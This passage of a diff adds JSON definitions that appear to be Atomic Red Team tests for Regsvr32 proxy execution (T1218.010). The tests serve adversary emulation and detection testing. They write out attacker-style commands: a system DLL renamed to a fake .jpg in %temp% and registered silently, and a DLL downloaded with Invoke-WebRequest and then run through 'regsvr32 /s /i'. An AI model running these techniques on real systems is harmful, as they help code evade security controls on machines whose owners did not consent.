+                                "description": "Path to renamed dll file to be registered",
+                                "type": "path",
+                                "default": "%temp%\\shell32.jpg"
+                            },
+                            "regsvr32path": {
+                                "description": "Default location of Regsvr32.exe",
+                                "type": "path",
+                                "default": "C:\\Windows\\system32"
+                            },
+                            "regsvr32name": {
+                                "description": "Default name of Regsvr32.exe",
+                                "type": "string",
+                                "default": "regsvr32.exe"
+                            }
+                        },
+                        "dependency_executor_name": "command_prompt",
+                        "dependencies": [
+                            {
+                                "description": "Test requires a renamed dll file\n",
+                                "prereq_command": "if exist #{dll_file} ( exit 0 ) else ( exit 1 )\n",
+                                "get_prereq_command": "copy \"C:\\Windows\\System32\\shell32.dll\" \"#{dll_file}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "command": "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n",
+                            "cleanup_command": "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
+                        }
+                    },
+                    {
+                        "name": "Regsvr32 Silent DLL Install Call DllRegisterServer",
+                        "auto_generated_guid": "9d71c492-ea2e-4c08-af16-c6994cdf029f",
+                        "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "dll_name": {
+                                "description": "Name of DLL to Install",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
+                            },
+                            "regsvr32path": {
+                                "description": "Default location of Regsvr32.exe",
+                                "type": "string",
+                                "default": "C:\\Windows\\system32"
+                            },
+                            "regsvr32name": {
+                                "description": "Default name of Regsvr32.exe",
+                                "type": "string",
+                                "default": "regsvr32.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
+                                "prereq_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\""
+                            }
+                        ],
+                        "executor": {
+                            "command": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n",
+                            "name": "command_prompt"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 14:18:41"
+}
